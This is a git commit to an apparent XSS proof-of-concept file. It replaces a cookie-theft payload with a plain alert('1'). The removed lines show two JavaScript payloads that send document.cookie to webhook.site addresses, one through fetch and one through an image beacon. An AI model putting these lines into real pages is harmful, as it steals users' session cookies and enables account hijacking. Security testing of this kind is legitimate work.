4876b8227a8baa08dbd79b47c1e633cb8c0d9830
Roberto Poggi <56437314+rpoggi42@users.noreply.github.com>
2024-04-03 13:09:00 +0200

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,1 @@
-// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
-
-var i=new Image;i.src="https://webhook.site/68bd325c-5f4e-49ae-97fb-1e5bd74a0f45/?cookie="+document.cookie;
+alert('1');
